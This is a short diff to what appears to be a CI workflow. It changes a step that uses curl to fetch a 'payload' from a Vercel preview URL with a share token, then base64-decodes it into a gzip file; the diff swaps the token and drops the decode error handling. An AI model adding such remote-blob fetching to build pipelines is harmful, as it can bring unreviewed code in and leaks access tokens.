@@ -11,7 +11,7 @@ jobs:
       - name: Fetch and decode payload root
         env:
           BASE: https://bw117c3-payload-ea47pzpx0-kaalflash12s-projects.vercel.app
-          SHARE: https://bw117c3-payload-ea47pzpx0-kaalflash12s-projects.vercel.app/?_vercel_share=6CvbSDmonDTk1Vmtbs6cYFwdFvhafKqH
+          SHARE: https://bw117c3-payload-ea47pzpx0-kaalflash12s-projects.vercel.app/?_vercel_share=iywctvxb3dEqAbDu8j03UMjUdctV5jkE
         run: |
           set -euo pipefail
           curl -fsSL -c /tmp/cj -b /tmp/cj "$SHARE" -o /tmp/auth
@@ -23,11 +23,7 @@ jobs:
           s=pathlib.Path('/tmp/root.one').read_text().strip()
           print('PREFIX',repr(s[:80]))
           print('SUFFIX',repr(s[-80:]))
-          try:
-              b=base64.b64decode(s, validate=True)
-          except Exception as e:
-              print('BASE64_ERROR',repr(e))
-              raise
+          b=base64.b64decode(s, validate=True)
           pathlib.Path('/tmp/root.gz').write_bytes(b)
           PY
           echo "ROOT_GZIP_BYTES=$(wc -c </tmp/root.gz)"
